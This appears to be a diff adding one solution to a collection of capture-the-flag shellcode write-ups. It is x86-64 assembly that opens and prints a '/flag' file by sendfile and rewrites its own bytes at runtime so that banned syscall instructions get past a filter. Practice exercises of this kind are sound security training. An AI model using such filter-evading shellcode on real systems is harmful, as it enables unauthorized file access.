@@ -73,6 +73,45 @@ syscall
 ```
 ## 5
 ```s
+.intel_syntax noprefix
+.globl _start
+
+.section .text
+
+_start:
+
+push 0x616c662f
+mov dword ptr [rsp+4],0x67  # mov rbx,0x00000067616c662f; push rbx
+push rsp
+pop rdi                     # mov rdi,rsp
+push 0
+pop rsi                     # xor rsi,rsi
+push 2
+pop rax                     # mov rax,2
+inc byte ptr [rip]
+.byte 0x0e,0x05             # syscall
+
+push 1
+pop rdi                     # mov rdi,1
+push rax
+pop rsi                     # mov rsi,rax
+push 0
+pop rdx                     # xor rdx,rdx
+push 60
+pop r10                     # mov r10,60
+push 40
+pop rax                     # mov rax,40
+inc byte ptr [rip]
+.byte 0x0e,0x05             # syscall
+
+push 0                      
+pop rdi                     # xor rdi,rdi
+push 60
+pop rax                     # mov rax,60
+inc byte ptr [rip]
+.byte 0x0e,0x05             # syscall
+
+.section .data
 
 ```
 ## 6
